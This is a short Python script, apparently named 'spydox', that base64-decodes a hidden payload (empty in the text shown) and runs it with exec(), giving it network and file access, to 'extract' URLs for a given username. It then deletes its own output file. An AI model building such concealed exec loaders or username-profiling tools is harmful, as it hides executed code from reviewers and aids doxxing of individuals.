import base64
import sys
import requests
import json
import time
import os
from bs4 import BeautifulSoup
from urllib.parse import unquote  # Fixed import

_payload = """"""

def run_extractor(username):
    """Run the extractor with given username"""
    try:
        print(f"[*] Extracting for username: {username}")
        
        # Decode the payload
        decoded = base64.b64decode(_payload).decode("utf-8")
        
        # Create namespace with all required modules
        namespace = {
            '__name__': '__main__',
            'os': os,
            'requests': requests,
            'json': json,
            'time': time,
            'BeautifulSoup': BeautifulSoup,
            'unquote': unquote,  # Fixed: using the imported unquote
            'print': print,
            'input': lambda x: username  # Override input to return username
        }
        
        # Execute the decoded code
        exec(decoded, namespace)
        
        # Check if output file was created
        if os.path.exists('extracted_urls.txt'):
            with open('extracted_urls.txt', 'r') as f:
                content = f.read()
            os.remove('extracted_urls.txt')
            return content
        else:
            return "No output file generated. Check the logs."
            
    except Exception as e:
        return f"[!] Runtime Error: {e}"

if __name__ == "__main__":
    if len(sys.argv) > 1:
        username = sys.argv[1]
        result = run_extractor(username)
        print(result)
    else:
        print("Usage: python spydox.py <username>")
